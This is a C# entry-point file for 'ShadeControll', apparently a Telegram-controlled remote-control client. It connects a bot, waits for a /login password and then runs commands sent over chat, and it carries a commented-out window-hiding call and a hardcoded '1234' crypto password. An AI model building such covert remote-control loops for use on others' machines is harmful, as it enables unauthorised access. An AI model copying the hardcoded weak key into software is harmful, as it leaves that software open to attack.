using System;
using System.Threading;
using System.Collections.Generic;
using ShadeControll.Commands;
using Salaros.Configuration;
using System.IO;
using System.Globalization;
using ShadeControll.Core;
using ShadeControll.Core.Encryption;

namespace ShadeControll
{
    class Program
    {
        #region CryptoData
        private static readonly string CRYPTO_PASSWORD = "1234";
        private static readonly string CRYPTO_SALT = "FRBbCT0CIAQjWHwbKid9ZXsJIFZPCG1PDyMXOVMTTm00K0dpSiB2RHg3FXVqCRtLT1FzcS94Wg4jDHoaamYxEAoPZn5fFRtcEltdGXN3ZQcJTGkDH10/PFA6Rj4lXVkTBwVrWyIcbDs2GF9TG0IaKyd0Eh99LnAtUCsvJU5cNzUCSxNuDQpkbWAuTAh+ayEOIBwYMUw7FlgVPwt2bEdtWmAqUVAwLB8eECQ/T2JoL2ULIQYzRQdpRzY6Wk1+bgEZQXInVBpQXnR8eiEofEZ2LBEma0xCOxZaQQsbdVJRHyEkJg9vQltLO0MRNkplQktvRC49WQM1VwZdTRQPNWgiK1w=";
        private static readonly string CRYPTO_IV = "IZ/AQ6zjaCGSB+LbMs9uLA==";
        #endregion

        public static TelegramClient telegramClient;
        public static CryptCredentials myCryptCredentials;
        public static Config config;
        public static Loger loger;
        public static readonly string configFileName = "config.cfg";
        public static bool IsLogged = false;
        static void Main()
        {
            // Preparing
            //Ninja.Hide();

            #region Initation
            myCryptCredentials = CryptCredentials.FromPassword(CRYPTO_PASSWORD, CRYPTO_SALT, CRYPTO_IV);
            config = new Config(configFileName, myCryptCredentials);
            loger = new Loger(config.GetValue("directories", "logs"));
            telegramClient = new TelegramClient(config.GetValue("info","key"));
            #endregion

            #region Connecting
            while(!telegramClient.Connect())  {  Thread.Sleep(1000);  }
            #endregion

            #region First Run
            if (config.GetValue("info","first_run") == "true")
            {
                telegramClient.SendMessage("The instalation or update was successful 🤩 /version");
                config.SetValue("info", "first_run", "false");
            }
            else
            {
                telegramClient.SendMessage("ShadeControll is Running\n /login [password]");
            }
            #endregion
            telegramClient.NewMessage += Client_NewMessage;
            while (true) { Thread.Sleep(1000); }
        }

        #region Telegram Listener
        private static void Client_NewMessage(string message)
        {
            loger.Log("<<" + message + Environment.NewLine);
            Cmd _cmd = new Cmd(message);
            foreach (Command cmd in Command.AvailableCommands)
            {
                if (cmd.CommandPrompt == _cmd.CommandPrompt) 
                { 
                    if(IsLogged)
                    {
                        cmd.Execute(_cmd.Args);
                    }
                    else
                    {
                        if (_cmd.CommandPrompt == "/login")
                        {
                            cmd.Execute(_cmd.Args);
                        }
                        else
                        {
                            telegramClient.SendMessage("Please use command /login [password] to get accesss");
                        }
                    }
                }
            }   
        }
        #endregion
    }
}
